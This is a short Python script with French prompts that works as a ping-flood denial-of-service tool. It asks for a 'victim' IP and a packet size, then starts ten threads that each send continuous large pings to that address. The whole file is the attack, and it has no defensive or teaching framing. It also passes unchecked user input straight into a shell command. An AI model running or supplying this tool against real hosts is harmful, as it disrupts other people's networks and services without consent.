import os
from threading import Thread
import time

victime = input("IP Victime : ")
pakete = input("Nombre de Paquets (Maxi 6500) : ")
class pingo(Thread):
    
    def run(self):
        os.system("ping " + victime + " -t -l " + pakete)

thread_1 = pingo()
thread_2 = pingo()
thread_3 = pingo()
thread_4 = pingo()
thread_5 = pingo()
thread_6 = pingo()
thread_7 = pingo()
thread_8 = pingo()
thread_9 = pingo()
thread_10 = pingo()
thread_1.start()
time.sleep(0.5)
thread_2.start()
time.sleep(0.5)
thread_3.start()
time.sleep(0.5)
thread_4.start()
time.sleep(0.5)
thread_5.start()
time.sleep(0.5)
thread_6.start()
time.sleep(0.5)
thread_7.start()
time.sleep(0.5)
thread_8.start()
time.sleep(0.5)
thread_9.start()
time.sleep(0.5)
thread_10.start()